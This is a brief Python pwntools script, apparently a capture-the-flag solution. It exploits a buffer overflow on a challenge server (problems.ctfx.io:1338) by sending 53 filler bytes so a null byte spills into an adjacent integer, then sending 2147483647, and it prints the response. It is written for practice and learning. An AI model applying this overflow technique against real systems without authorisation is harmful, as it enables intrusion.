from pwn import *
import time
context(arch='i386', os='linux') # <-- Add the architecture and os

HOST,PORT = "problems.ctfx.io",1338
r=remote(HOST,PORT)

r.sendline("a" * 53)  # fill the text buffer, and make the null byte overflow into the int's memory
time.sleep(0.1)
r.sendline("2147483647")  # a large number will ensure that the null byte (which is in the int's memory) is overwritten
time.sleep(0.1)

print r.recv(4000)
